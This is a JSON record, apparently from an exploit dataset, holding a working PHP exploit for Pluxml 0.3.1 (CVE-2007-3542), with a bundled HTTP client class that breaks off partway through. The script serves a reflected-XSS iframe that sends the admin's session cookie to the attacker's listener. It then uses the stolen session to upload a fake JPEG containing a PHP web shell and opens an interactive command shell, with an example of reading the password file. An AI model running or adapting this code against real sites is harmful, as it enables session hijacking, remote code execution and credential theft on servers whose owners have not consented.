{
  "id": "4096",
  "title": "Pluxml 0.3.1 - Remote Code Execution",
  "cve": "CVE-2007-3542",
  "vuln_type": "xss_reflected",
  "code": "<?php\r\n# C:\\> sploit.php -url http://victim.com/pluxml0.3.1/ -ip 90.27.10.196\r\n# [/]Waiting for connection on http://90.27.10.196:80/\r\n# [!]Now you have to make the victim to click on the url\r\n# [+]Received 395 bytes from 182.26.54.2:2007\r\n# [+]Sending 366 bytes to 182.26.54.2:2007\r\n# [+]Received 326 bytes from 182.26.54.2:2009\r\n# [+]Sending 366 bytes to 182.26.54.2:2009\r\n# [+]Received 692 bytes from 182.26.54.2:2010\r\n# [!]Received one cookie from 182.26.54.2:2010\r\n# [/]Verifying if there is a valid session id cookie\r\n# [-]No: pollvote=1\r\n# [!]Yes: PHPSESSID=c6255827c1a07c51a95af691a612484b\r\n# [+]The created socket has been shut down\r\n# $shell> whoami\r\n# darkfig\r\n#\r\nif($argc < 5)\r\n{\r\nprint(\"\r\n------------ Pluxml 0.3.1 Remote Code Execution Exploit -------------\r\n---------------------------------------------------------------------\r\n             Credits: DarkFig <gmdarkfig@gmail.com>\r\n                 URL: acid-root.new.fr || mgsdl.free.fr\r\n                 IRC: #acidroot@irc.worldnet.net\r\n                Note: Coded for fun 8)\r\n---------------------------------------------------------------------\r\n   Usage: $argv[0] -url <> -ip <> [Options]\r\n  Params: -url       For example http://victim.com/pluxml0.3.1/\r\n          -ip        The IP that will be bound to the socket\r\n Options: -port      The socket will listen on this port (default=80)\r\n          -proxy     If you wanna use a proxy <proxyhost:proxyport> \r\n          -proxyauth Basic authentification <proxyuser:proxypwd>\r\n---------------------------------------------------------------------\r\n\");exit(1);\r\n}\r\n\r\n# PhpSploit object\r\n####################\r\n$xpl = new phpsploit();\r\n$xpl->agent('Firefox');\r\n\r\n# Server\r\n##########\r\n$server_addr = getparam('ip',1);\r\n$server_port = (getparam('port')!='') ? getparam('port') : '80';\r\n$server_url  = \"http://$server_addr:$server_port/\";\r\n\r\n# Victim\r\n##########\r\n$hack = getparam('url',1);\r\n$html = \"<h1>hello :)</h1>\\n\";\r\n\r\n# Apparently my XSS bypass NoScript protection\r\n################################################\r\n$xss  = \"<iframe src='${hack}pluxml/admin/auth.php?msg=\"\r\n       .\"<script>document.location=(\".char($server_url.'?c=')\r\n       .\".concat(document.cookie))</script>'\"\r\n       .\" height=0 width=0>\";\r\n\r\n# Socket\r\n##########\r\n$handle = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\r\nsocket_bind($handle, $server_addr, $server_port);\r\nsocket_listen($handle);\r\n\r\nprint \"\\n[/]Waiting for connection on $server_url\";\r\nprint \"\\n[!]Now you have to make the victim to click on the url\";\r\n\r\n# Wait until we get admin rights\r\n##################################\r\nwhile(TRUE)\r\n{\r\n\t$packet = '';\r\n\t\r\n\tif(!$msg = socket_accept($handle))\r\n\t   exit(1);\r\n\r\n\t# End of the packet ?\r\n\t######################\r\n\twhile(!ereg(\"\\r\\n\\r\\n\",$packet))\r\n\t   $packet .= socket_read($msg, 2048, PHP_BINARY_READ);\r\n\t   \r\n        socket_getpeername($msg, $clientaddr, $clientport);\r\n        print \"\\n[+]Received \".strlen($packet).\" bytes from $clientaddr:$clientport\";\r\n\r\n\t# Server response\r\n\t##################\r\n\t$serv =\r\n\t \"HTTP 1.x 200 OK\\r\\n\"\r\n\t.\"Connection: close\\r\\n\"\r\n\t.\"Transfer-Encoding: chunked\\r\\n\"\r\n\t.\"Content-Type: text/html\\r\\n\\r\\n\"\r\n\t.$html.$xss.\"\\r\\n\\r\\n\";\r\n\r\n\t# Is there a cookie ?\r\n\t#######################\r\n\tif(preg_match(\"#\\?c=(\\S*) HTTP/1\\.([01x]+)#\", $packet, $cookies))\r\n\t{\r\n\t\tprint \"\\n[!]Received one cookie from $clientaddr:$clientport\";\r\n\t\tprint \"\\n[/]Verifying if there is a valid session id cookie\";\r\n\t\t$cookie = explode(';%20',$cookies[1]);\r\n\t\t\r\n\t\tforeach($cookie as $session)\r\n\t\t{\r\n\t\t\t# Valid session id ?\r\n\t\t\t#######################\r\n\t\t\tif(is_valid_session($session))\r\n\t\t\t\r\n\t\t\t   # Let's upload a file\r\n\t\t\t   #######################\r\n\t\t\t   code_execution();\r\n\t\t}\r\n\t\tprint \"\\n[-]No valid session id cookie found\";\r\n\t\tprint \"\\n[/]Always waiting for connection\";\r\n\t}\r\n\t# Answer to the client\r\n\t########################\r\n\telse\r\n\t{\r\n\t\tprint \"\\n[+]Sending \".strlen($serv).\" bytes to $clientaddr:$clientport\";\r\n\t\tsocket_write($msg, $serv, strlen($serv));\r\n\t}\r\n\tsocket_close($msg);\r\n}\r\n\r\n# Function which is like getopt()\r\n###################################\r\nfunction getparam($param,$opt='')\r\n{\r\n\tglobal $argv;\r\n\t\r\n\tforeach($argv as $value => $key)\r\n\t{\r\n\t\tif($key == '-'.$param)\r\n\t\t   return $argv[$value+1];\r\n\t}\r\n\t\r\n\tif($opt)\r\n\t   exit(\"-$param parameter required\");\r\n\telse\r\n\t   return;\r\n}\r\n\r\n# Bypass magic_quotes_gpc\r\n###########################\r\nfunction char($data)\r\n{\r\n\t$char = 'String.fromCharCode(';\r\n\t\r\n\tfor($i=0;$i<strlen($data);$i++)\r\n\t{\r\n\t\t$char .= ord($data[$i]);\r\n\t\tif($i != (strlen($data)-1))\r\n\t\t   $char .= ',';\r\n\t}\r\n\treturn $char.')';\r\n}\r\n\r\n# Admin session always available ?\r\n###################################\r\nfunction is_valid_session($session)\r\n{\r\n\tglobal $xpl,$hack;\r\n\t\r\n\t$xpl->addheader('Cookie',$session);\r\n\t$xpl->get($hack.'pluxml/admin/index.php');\r\n\t\r\n\tif(eregi('Location: auth.php', $xpl->getheader()))\r\n\t{\r\n\t\tprint \"\\n[-]No: $session\";\r\n\t\treturn FALSE;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tprint \"\\n[!]Yes: $session\";\r\n\t\treturn TRUE;\r\n\t}\r\n}\r\n\r\n# File upload vulnerability\r\n#############################\r\nfunction code_execution()\r\n{\r\n\tglobal $xpl,$hack,$msg;\r\n\t\r\n\tsocket_close($msg);\r\n\tprint \"\\n[+]The created socket has been shut down\";\r\n\t\r\n\t# +images.php [File Upload Vulnerability]\r\n\t# |\r\n\t# 11. if(!empty($_FILES)){\r\n\t# 12.    $uploaddir = '../../images/';\r\n\t# 13.    $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);\r\n\t# 14. if(getimagesize($_FILES['userfile']['tmp_name'])){\r\n\t# 15.\t move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile);\r\n\t# 16.\t chmod($uploadfile, 0777);\r\n\t# 17.\t $msg = 'Image envoy\u00c3\u00a9e';\r\n\t# 18. }else{\r\n\t# 19.\t $msg = 'Le fichier n\\'est pas une image';\r\n\t# 20. }\r\n\t# 21. header('Location: images.php?msg='.$msg);\r\n\t# 22. }\r\n\t#\r\n\t# Fake JPG 1x1\r\n\t# 000000A0 007F 3C3F 7068 700D 0A69 6628 6973 7365 ..<?php..if(isse\r\n\t# 000000B0 7428 245F 5345 5256 4552 5B48 5454 505F t($_SERVER[HTTP_\r\n\t# 000000C0 5348 454C 4C5D 2929 0D0A 7B0D 0A70 7269 SHELL]))..{..pri\r\n\t# 000000D0 6E74 2031 3233 3435 3637 3839 3130 3131 nt 1234567891011\r\n\t# 000000E0 3132 3B0D 0A65 7661 6C28 245F 5345 5256 12;..eval($_SERV\r\n\t# 000000F0 4552 5B48 5454 505F 5348 454C 4C5D 293B ER[HTTP_SHELL]);\r\n\t# 00000100 0D0A 7072 696E 7420 3132 3334 3536 3738 ..print 12345678\r\n\t# 00000110 3931 3031 3131 323B 0D0A 7D0D 0A3F 3EFF 9101112;..}..?\\>.\r\n\t#\r\n\t$fakejpg =\r\n\t\"\\xFF\\xD8\\xFF\\xE0\\x00\\x10\\x4A\\x46\\x49\\x46\\x00\\x01\\x01\\x01\\x00\"\r\n\t.\"\\x60\\x00\\x60\\x00\\x00\\xFF\\xDB\\x00\\x43\\x00\\x08\\x06\\x06\\x07\\x06\"\r\n\t.\"\\x05\\x08\\x07\\x07\\x07\\x09\\x09\\x08\\x0A\\x0C\\x14\\x0D\\x0C\\x0B\\x0B\"\r\n\t.\"\\x0C\\x19\\x12\\x13\\x0F\\x14\\x1D\\x1A\\x1F\\x1E\\x1D\\x1A\\x1C\\x1C\\x20\"\r\n\t.\"\\x24\\x2E\\x27\\x20\\x22\\x2C\\x23\\x1C\\x1C\\x28\\x37\\x29\\x2C\\x30\\x31\"\r\n\t.\"\\x34\\x34\\x34\\x1F\\x27\\x39\\x3D\\x38\\x32\\x3C\\x2E\\x33\\x34\\x32\\xFF\"\r\n\t.\"\\xDB\\x00\\x43\\x01\\x09\\x09\\x09\\x0C\\x0B\\x0C\\x18\\x0D\\x0D\\x18\\x32\"\r\n\t.\"\\x21\\x1C\\x21\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\"\r\n\t.\"\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\"\r\n\t.\"\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\"\r\n\t.\"\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\x32\\xFF\\xFE\\x00\\x7F\\x3C\\x3F\\x70\"\r\n\t.\"\\x68\\x70\\x0D\\x0A\\x69\\x66\\x28\\x69\\x73\\x73\\x65\\x74\\x28\\x24\\x5F\"\r\n\t.\"\\x53\\x45\\x52\\x56\\x45\\x52\\x5B\\x48\\x54\\x54\\x50\\x5F\\x53\\x48\\x45\"\r\n\t.\"\\x4C\\x4C\\x5D\\x29\\x29\\x0D\\x0A\\x7B\\x0D\\x0A\\x70\\x72\\x69\\x6E\\x74\"\r\n\t.\"\\x20\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x31\\x30\\x31\\x31\\x31\"\r\n\t.\"\\x32\\x3B\\x0D\\x0A\\x65\\x76\\x61\\x6C\\x28\\x24\\x5F\\x53\\x45\\x52\\x56\"\r\n\t.\"\\x45\\x52\\x5B\\x48\\x54\\x54\\x50\\x5F\\x53\\x48\\x45\\x4C\\x4C\\x5D\\x29\"\r\n\t.\"\\x3B\\x0D\\x0A\\x70\\x72\\x69\\x6E\\x74\\x20\\x31\\x32\\x33\\x34\\x35\\x36\"\r\n\t.\"\\x37\\x38\\x39\\x31\\x30\\x31\\x31\\x31\\x32\\x3B\\x0D\\x0A\\x7D\\x0D\\x0A\"\r\n\t.\"\\x3F\\x3E\\xFF\\xC0\\x00\\x11\\x08\\x00\\x01\\x00\\x01\\x03\\x01\\x22\\x00\"\r\n\t.\"\\x02\\x11\\x01\\x03\\x11\\x01\\xFF\\xC4\\x00\\x1F\\x00\\x00\\x01\\x05\\x01\"\r\n\t.\"\\x01\\x01\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\"\r\n\t.\"\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0A\\x0B\\xFF\\xC4\\x00\\xB5\\x10\\x00\"\r\n\t.\"\\x02\\x01\\x03\\x03\\x02\\x04\\x03\\x05\\x05\\x04\\x04\\x00\\x00\\x01\\x7D\"\r\n\t.\"\\x01\\x02\\x03\\x00\\x04\\x11\\x05\\x12\\x21\\x31\\x41\\x06\\x13\\x51\\x61\"\r\n\t.\"\\x07\\x22\\x71\\x14\\x32\\x81\\x91\\xA1\\x08\\x23\\x42\\xB1\\xC1\\x15\\x52\"\r\n\t.\"\\xD1\\xF0\\x24\\x33\\x62\\x72\\x82\\x09\\x0A\\x16\\x17\\x18\\x19\\x1A\\x25\"\r\n\t.\"\\x26\\x27\\x28\\x29\\x2A\\x34\\x35\\x36\\x37\\x38\\x39\\x3A\\x43\\x44\\x45\"\r\n\t.\"\\x46\\x47\\x48\\x49\\x4A\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5A\\x63\\x64\"\r\n\t.\"\\x65\\x66\\x67\\x68\\x69\\x6A\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7A\\x83\"\r\n\t.\"\\x84\\x85\\x86\\x87\\x88\\x89\\x8A\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\"\r\n\t.\"\\x9A\\xA2\\xA3\\xA4\\xA5\\xA6\\xA7\\xA8\\xA9\\xAA\\xB2\\xB3\\xB4\\xB5\\xB6\"\r\n\t.\"\\xB7\\xB8\\xB9\\xBA\\xC2\\xC3\\xC4\\xC5\\xC6\\xC7\\xC8\\xC9\\xCA\\xD2\\xD3\"\r\n\t.\"\\xD4\\xD5\\xD6\\xD7\\xD8\\xD9\\xDA\\xE1\\xE2\\xE3\\xE4\\xE5\\xE6\\xE7\\xE8\"\r\n\t.\"\\xE9\\xEA\\xF1\\xF2\\xF3\\xF4\\xF5\\xF6\\xF7\\xF8\\xF9\\xFA\\xFF\\xC4\\x00\"\r\n\t.\"\\x1F\\x01\\x00\\x03\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x00\\x00\"\r\n\t.\"\\x00\\x00\\x00\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0A\\x0B\"\r\n\t.\"\\xFF\\xC4\\x00\\xB5\\x11\\x00\\x02\\x01\\x02\\x04\\x04\\x03\\x04\\x07\\x05\"\r\n\t.\"\\x04\\x04\\x00\\x01\\x02\\x77\\x00\\x01\\x02\\x03\\x11\\x04\\x05\\x21\\x31\"\r\n\t.\"\\x06\\x12\\x41\\x51\\x07\\x61\\x71\\x13\\x22\\x32\\x81\\x08\\x14\\x42\\x91\"\r\n\t.\"\\xA1\\xB1\\xC1\\x09\\x23\\x33\\x52\\xF0\\x15\\x62\\x72\\xD1\\x0A\\x16\\x24\"\r\n\t.\"\\x34\\xE1\\x25\\xF1\\x17\\x18\\x19\\x1A\\x26\\x27\\x28\\x29\\x2A\\x35\\x36\"\r\n\t.\"\\x37\\x38\\x39\\x3A\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4A\\x53\\x54\\x55\"\r\n\t.\"\\x56\\x57\\x58\\x59\\x5A\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6A\\x73\\x74\"\r\n\t.\"\\x75\\x76\\x77\\x78\\x79\\x7A\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8A\"\r\n\t.\"\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9A\\xA2\\xA3\\xA4\\xA5\\xA6\\xA7\"\r\n\t.\"\\xA8\\xA9\\xAA\\xB2\\xB3\\xB4\\xB5\\xB6\\xB7\\xB8\\xB9\\xBA\\xC2\\xC3\\xC4\"\r\n\t.\"\\xC5\\xC6\\xC7\\xC8\\xC9\\xCA\\xD2\\xD3\\xD4\\xD5\\xD6\\xD7\\xD8\\xD9\\xDA\"\r\n\t.\"\\xE2\\xE3\\xE4\\xE5\\xE6\\xE7\\xE8\\xE9\\xEA\\xF2\\xF3\\xF4\\xF5\\xF6\\xF7\"\r\n\t.\"\\xF8\\xF9\\xFA\\xFF\\xDA\\x00\\x0C\\x03\\x01\\x00\\x02\\x11\\x03\\x11\\x00\"\r\n\t.\"\\x3F\\x00\\xF7\\xFA\\x28\\xA2\\x80\\x3F\\xFF\\xD9\";\r\n\t\r\n\t$formdata = array(\r\n\t            frmdt_url => $hack.'pluxml/admin/images.php',\r\n\t            'userfile' => array(\r\n\t                          frmdt_filename => 'iwashere.php',\r\n\t                          frmdt_content => $fakejpg));\r\n\r\n\t$xpl->formdata($formdata);\r\n\tprint \"\\n\\$shell> \";\r\n\r\n\twhile(!preg_match('#^(quit|exit)$#', ($cmd = trim(fgets(STDIN)))))\r\n\t{\r\n\t\t# $shell> cat ../pluxml/conf/password.xml\r\n\t\t########################################\r\n\t\t$xpl->addheader('Shell',\"system('$cmd');\");\r\n\t\t$xpl->get($hack.'images/iwashere.php');\r\n\t\t$content = explode('1.23456789101E+014',$xpl->getcontent());\r\n\t\tprint $content[1].\"\\n\\$shell> \";\r\n\t}\r\n\texit(0);\r\n}\r\n\r\n/*\r\n * \r\n * Copyright (C) darkfig\r\n * \r\n * This program is free software; you can redistribute it and/or \r\n * modify it under the terms of the GNU General Public License \r\n * as published by the Free Software Foundation; either version 2 \r\n * of the License, or (at your option) any later version. \r\n * \r\n * This program is distributed in the hope that it will be useful, \r\n * but WITHOUT ANY WARRANTY; without even the implied warranty of \r\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the \r\n * GNU General Public License for more details. \r\n * \r\n * You should have received a copy of the GNU General Public License \r\n * along with this program; if not, write to the Free Software \r\n * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\r\n * \r\n * TITLE:          PhpSploit Class\r\n * REQUIREMENTS:   PHP 4 / PHP 5\r\n * VERSION:        2.0\r\n * LICENSE:        GNU General Public License\r\n * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt\r\n * FILENAME:       phpsploitclass.php\r\n *\r\n * CONTACT:        gmdarkfig@gmail.com (french / english)\r\n * GREETZ:         Sparah, Ddx39\r\n *\r\n * DESCRIPTION:\r\n * The phpsploit is a class implementing a web user agent.\r\n * You can add cookies, headers, use a proxy server with (or without) a\r\n * basic authentification. It supports the GET and the POST method. It can\r\n * also be used like a browser with the cookiejar() function (which allow\r\n * a server to add several cookies for the next requests) and the\r\n * allowredirection() function (which allow the script to follow all\r\n * redirections sent by the server). It can return the content (or the\r\n * headers) of the request. Others useful functions can be used for debugging.\r\n * A manual is actually in development but to know how to use it, you can\r\n * read the comments.\r\n *\r\n * CHANGELOG:\r\n *\r\n * [2007-06-10] (2.0)\r\n *  * Code: Code optimization\r\n *  * New: Compatible with PHP 4 by default\r\n *\r\n * [2007-01-24] (1.2)\r\n *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))\r\n *  * New: multipart/form-data enctype is now supported \r\n *\r\n * [2006-12-31] (1.1)\r\n *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)\r\n *  * New: You can now call the getheader() / getcontent() function without parameters\r\n *\r\n * [2006-12-30] (1.0)\r\n *  * First version\r\n * \r\n */\r\n\r\nclass phpsploit\r\n{\r\n\tvar $proxyhost;\r\n\tvar $proxyport;\r\n\tvar $host;\r\n\tvar $path;\r\n\tvar $port;\r\n\tvar $method;\r\n\tvar $url;\r\n\tvar $packet;\r\n\tvar $proxyuser;\r\n\tvar $proxypass;\r\n\tvar $header;\r\n\tvar $cookie;\r\n\tvar $data;\r\n\tvar $boundary;\r\n\tvar $allowredirection;\r\n\tvar $last_redirection;\r\n\tvar $cookiejar;\r\n\tvar $recv;\r\n\tvar $cookie_str;\r\n\tvar $header_str;\r\n\tvar $server_content;\r\n\tvar $server_header;\r\n\t\r\n\r\n\t/**\r\n\t * This function is called by the\r\n\t * get()/post()/formdata() functions.\r\n\t * You don't have to call it, this is\r\n\t * the main function.\r\n\t *\r\n\t * @access private\r\n\t * @return string $this->recv ServerResponse\r\n\t * \r\n\t */\r\n\tfunction sock()\r\n\t{\r\n\t\tif(!empty($this->proxyhost) && !empty($this->proxyport))\r\n\t\t   $socket = @fsockopen($this->proxyhost,$this->proxyport);\r\n\t\telse\r\n\t\t   $socket = @fsockopen($this->host,$this->port);\r\n\t\t\r\n\t\tif(!$socket)\r\n\t\t   die(\"Error: Host seems down\");\r\n\t\t\r\n\t\tif($this->method=='get')\r\n\t\t   $this->packet = 'GET '.$this->url.\" HTTP/1.1\\r\\n\";\r\n\t\t   \r\n\t\telseif($this->method=='post' or $this->method=='formdata')\r\n\t\t   $this->packet = 'POST '.$this->url.\" HTTP/1.1\\r\\n\";\r\n\t\t   \r\n\t\telse\r\n\t\t   die(\"Error: Invalid method\");\r\n\t\t\r\n\t\tif(!empty($this->proxyuser))\r\n\t\t   $this->packet .= 'Proxy-Authorization: Basic '.base64_encode($this->proxyuser.':'.$this->proxypass).\"\\r\\n\";\r\n\t\t\r\n\t\tif(!empty($this->header))\r\n\t\t   $this->packet .= $this->showheader();\r\n\t\t   \r\n\t\tif(!empty($this->cookie))\r\n\t\t   $this->packet .= 'Cookie: '.$this->showcookie().\"\\r\\n\";\r\n\t\r\n\t\t$this->packet .= 'Host: '.$this->host.\"\\r\\n\";\r\n\t\t$this->packet .= \"Connection: Close\\r\\n\";\r\n\t\t\r\n\t\tif($this->method=='post')\r\n\t\t{\r\n\t\t\t$this->packet .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n\t\t\t$this->packet .= 'Content-Length: '.strlen($this->data).\"\\r\\n\\r\\n\";\r\n\t\t\t$this->packet .= $this->data.\"\\r\\n\";\r\n\t\t}\r\n\t\telseif($this->method=='formdata')\r\n\t\t{\r\n\t\t\t$this->packet .= 'Content-Type: multipart/form-data; boundary='.str_repeat('-',27).$this->boundary.\"\\r\\n\";\r\n\t\t\t$this->packet .= 'Content-Length: '.strlen($this->data).\"\\r\\n\\r\\n\";\r\n\t\t\t$this->packet .= $this->data;\r\n\t\t}\r\n\r\n\t\t$this->packet .= \"\\r\\n\";\r\n\t\t$this->recv = '';\r\n\r\n\t\tfputs($socket,$this->packet);\r\n\r\n\t\twhile(!feof($socket))\r\n\t\t   $this->recv .= fgets($socket);\r\n\r\n\t\tfclose($socket);\r\n\r\n\t\tif($this->cookiejar)\r\n\t\t   $this->getcookie();\r\n\r\n\t\tif($this->allowredirection)\r\n\t\t   return $this->getredirection();\r\n\t\telse\r\n\t\t   return $this->recv;\r\n\t}\r\n\t\r\n\r\n\t/**\r\n\t * This function allows you to add several\r\n\t * cookies in the request.\r\n\t * \r\n\t * @access  public\r\n\t * @param   string cookn CookieName\r\n\t * @param   string cookv CookieValue\r\n\t * @example $this->addcookie('name','value')\r\n\t * \r\n\t */\r\n\tfunction addcookie($cookn,$cookv)\r\n\t{\r\n\t\tif(!isset($this->cookie))\r\n\t\t   $this->cookie = array();\r\n\r\n\t\t$this->cookie[$cookn] = $cookv;\r\n\t}\r\n\r\n\r\n\t/**\r\n\t * This function allows you to add several\r\n\t * headers in the request.\r\n\t *\r\n\t * @access  public\r\n\t * @param   string headern HeaderName\r\n\t * @param   string headervalue Headervalue\r\n\t * @example $this->addheader('Client-IP', '128.5.2.3')\r\n\t * \r\n\t */\r\n\tfunction addheader($headern,$headervalue)\r\n\t{\r\n\t\tif(!isset($this->header))\r\n\t\t   $this->header = array();\r\n\t\t   \r\n\t\t$this->header[$headern] = $headervalue;\r\n\t}\r\n\r\n\r\n\t/**\r\n\t * This function allows you to use an\r\n\t * http proxy server. Several methods\r\n\t * are supported.\r\n\t * \r\n\t * @access  public\r\n\t * @param   string proxy ProxyHost\r\n\t * @param   integer proxyp ProxyPort\r\n\t * @example $this->proxy('localhost',8118)\r\n\t * @example $this->proxy('localhost:8118')\r\n\t * \r\n\t */\r\n\tfunction proxy($proxy,$proxyp='')\r\n\t{\r\n\t\tif(empty($proxyp))\r\n\t\t{\r\n\t\t\t$proxarr = explode(':',$proxy);\r\n\t\t\t$this->proxyhost = $proxarr[0];\r\n\t\t\t$this->proxyport = (int)$proxarr[1];\r\n\t\t}\r\n\t\telse \r\n\t\t{\r\n\t\t\t$this->proxyhost = $proxy;\r\n\t\t\t$this->proxyport = (int)$proxyp;\r\n\t\t}\r\n\r\n\t\tif($this->proxyport > 65535)\r\n\t\t   die(\"Error: Invalid port number\");\r\n\t}\r\n\t\r\n\r\n\t/**\r\n\t * This function allows you to use an\r\n\t * http proxy server which requires a\r\n\t * basic authentification. Several\r\n\t * methods are supported:\r\n\t *\r\n\t * @access  public\r\n\t * @param   string proxyauth ProxyUser\r\n\t * @param   string proxypass ProxyPass\r\n\t * @example $this->proxyauth('user','pwd')\r\n\t * @example $this->proxyauth('user:pwd');\r\n\t * \r\n\t */\r\n\tfunction proxyauth($proxyauth,$proxypass='')\r\n\t{\r\n\t\tif(empty($proxypass))\r\n\t\t{\r\n\t\t\t$posvirg = strpos($proxyauth,':');\r\n\t\t\t$this->proxyuser = substr($proxyauth,0,$posvirg);\r\n\t\t\t$this->proxypass = substr($proxyauth,$posvirg+1);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t$this->proxyuser = $proxyauth;\r\n\t\t\t$this->proxypass = $proxypass;\r\n\t\t}\r\n\t}\r\n\r\n\r\n\t/**\r\n\t * This function allows you to set\r\n\t * the 'User-Agent' header.\r\n\t * \r\n\t * @access  public\r\n\t * @param   string useragent Agent\r\n\t * @example $this->agent('Firefox')\r\n\t * \r\n\t */\r\n\tfunction agent($useragent)\r\n\t{\r\n\t\t$this->addheader('User-Agent',$useragent);\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the headers\r\n\t * which will be in the next request.\r\n\t * \r\n\t * @access  public\r\n\t * @return  string $this->header_str Headers\r\n\t * @example $this->showheader()\r\n\t * \r\n\t */\r\n\tfunction showheader()\r\n\t{\r\n\t\t$this->header_str = '';\r\n\t\t\r\n\t\tif(!isset($this->header))\r\n\t\t   return;\r\n\t\t   \r\n\t\tforeach($this->header as $name => $value)\r\n\t\t   $this->header_str .= $name.': '.$value.\"\\r\\n\";\r\n\t\t   \r\n\t\treturn $this->header_str;\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function returns the cookies\r\n\t * which will be in the next request.\r\n\t * \r\n\t * @access  public\r\n\t * @return  string $this->cookie_str Cookies\r\n\t * @example $this->showcookie()\r\n\t * \r\n\t */\r\n\tfunction showcookie()\r\n\t{\r\n\t\t$this->cookie_str = '';\r\n\t\t\r\n\t\tif(!isset($this->cookie))\r\n\t\t   return;\r\n\t\t\r\n\t\tforeach($this->cookie as $name => $value)\r\n\t\t   $this->cookie_str .= $name.'='.$value.'; ';\r\n\r\n\t\treturn $this->cookie_str;\r\n\t}\r\n\r\n\r\n\t/**\r\n\t * This function returns the last\r\n\t * formed http request.\r\n\t * \r\n\t * @access  public\r\n\t * @return  string $this->packet HttpPacket\r\n\t * @example $this->showlastrequest()\r\n\t * \r\n\t */\r\n\tfunction showlastrequest()\r\n\t{\r\n\t\tif(!isset($this->packet))\r\n\t\t   return;\r\n\t\telse\r\n\t\t   return $this->packet;\r\n\t}\r\n\r\n\r\n\t/**\r\n\t * This function sends the formed\r\n\t * http packet with the GET method.\r\n\t * \r\n\t * @access  public\r\n\t * @param   string url Url\r\n\t * @return  string $this->sock()\r\n\t * @example $this->get('localhost/index.php?var=x')\r\n\t * @example $this->get('http://localhost:88/tst.php')\r\n\t * \r\n\t */\r\n\tfunction get($url)\r\n\t{\r\n\t\t$this->target($url);\r\n\t\t$this->method = 'get';\r\n\t\treturn $this->sock();\r\n\t}\r\n\r\n\t\r\n\t/**\r\n\t * This function sends the formed\r\n\t * http packet with the POST method.\r\n\t *\r\n\t * @access  public\r\n\t * @param   string url  Url\r\n\t * @param   string data PostData\r\n\t * @return  string $this->sock()\r\n\t * @example $this->post('http://localhost/','helo=x')\r\n\t * \r\n\t */\t\r\n\tfunction post($url,$data)\r\n\t{\r\n\t\t$this->target($url);\r\n\t\t$this->method = 'post';\r\n\t\t$this->data = $data;\r\n\t\treturn $this->sock();\r\n\t}\r\n\t\r\n\r\n\t/**\r\n\t * This function sends the formed http\r\n\t * packet with the POST method using\r\n\t * the multipart/form-data enctype.\r\n\t * \r\n\t * @access  public\r\n\t * @param   array array FormDataArray\r\n\t * @return  string $this->sock()\r\n\t * @example $formdata = array(\r\n\t *                      frmdt_url => 'http://localhost/upload.php',\r\n\t *                      frmdt_boundary => '123456', # Optional\r\n\t *                      'var' => 'example',\r\n\t *                      'file' => array(\r\n\t *                                frmdt_type => 'image/gif',  # Optional\r\n\t *                                frmdt_transfert => 'binary' # Optional\r\n\t *                                frmdt_filename => 'hello.php,\r\n\t *                                frmdt_content => '<?php echo 1; ?>'));\r\n\t *          $this->formdata($formdata);\r\n\t * \r\n\t */\r\n\tfunction formdata($array)\r\n\t{\r\n\t\t$this->target($array[frmdt_url]);\r\n\t\t$this->method = 'formdata';\r\n\t\t$this->data = '';\r\n\t\t\r\n\t\tif(!isset($array[frmdt_boundary]))\r\n\t\t   $this->boundary = 'phpsploit';\r\n\t\telse\r\n\t\t   $this->boundary = $array[frmdt_boundary];\r\n\r\n\t\tforeach($array as $key => $value)\r\n\t\t{\r\n\t\t\tif(!preg_match('#^frmdt_(boundary|url)#',$key))\r\n\t\t\t{\r\n\t\t\t\t$this->data .= str_repeat('-',29).$this->boundary.\"\\r\\n\";\r\n\t\t\t\t$this->data .= 'Content-Disposition: form-data; name=\"'.$key.'\";';\r\n\t\t\t\t\r\n\t\t\t\tif(!is_array($value))\r\n\t\t\t\t{\r\n\t\t\t\t\t$this->data .= \"\\r\\n\\r\\n\".$value.\"\\r\\n\";\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\t$this->data .= ' filename=\"'.$array[$key][frmdt_filename].\"\\\";\\r\\n\";\r\n\r\n\t\t\t\t\tif(isset($array[$key][frmdt_type]))\r\n\t\t\t\t\t   $this->data .= 'Content-Type: '.$array[$key][frmdt_type].\"\\r\\n\";\r\n\r\n\t\t\t\t\tif(isset($array[$key][frmdt_transfert]))\r\n\t\t\t\t\t   $this->data .= 'Content-Transfer-Encoding: '.$array[$key][frmdt_transfert].\"\\r\\n\";\r\n\r\n\t\t\t\t\t$this->data .= \"\\r\\n\".$array[$key][frmdt_content].\"\\r\\n\";\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t$this->data .= 